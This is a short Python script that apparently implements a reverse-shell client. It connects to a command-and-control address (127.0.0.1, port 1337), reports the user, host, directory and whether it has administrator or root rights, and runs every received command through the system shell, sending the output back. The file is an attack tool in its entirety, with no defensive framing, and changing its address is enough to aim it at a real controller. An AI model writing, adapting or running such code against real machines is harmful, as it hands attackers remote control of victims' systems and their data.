import os
import socket
import sys
import subprocess
import time

def get_user_priv():
    system_platform = sys.platform
    if "win" in system_platform:
        try:
            temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
            return user_privileges(True)
        except PermissionError:
            return user_privileges(False)
    else:
        if os.getuid() == 0:
            return user_privileges(True)
        else:
            return user_privileges(False)

def user_privileges(high):
    if high == True:
        return "#"
    else:
        return "$"

def run_shell_terminal(command):
    if "cd" in command:
        try:
            os.chdir(command[3::])
        except FileNotFoundError as e:
            print(e)
        return
    command_out = subprocess.run(command, shell=True, capture_output=True)
    if command_out.stdout.decode("utf-8"):
        return command_out.stdout.decode("utf-8").strip("\n")
    else:
        return command_out.stderr.decode("utf-8").strip("\n")


def connection_to_c2(remote_ip , port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as c2:
        c2.connect((remote_ip,port))
        while True:
            shell_prompt = f"{os.getlogin()}:{socket.gethostname}:{os.getcwd()}:{get_user_priv()}: "
            c2.send(shell_prompt.encode())
            command = c2.recv(1024)
            command_out = run_shell_terminal(command.decode("utf-8"))
            c2.send(command_out.encode())
            time.sleep(1.5)

def main():
    try:
        connection_to_c2("127.0.0.1", 1337)
    except KeyboardInterrupt:
        print("\nbye...")

main()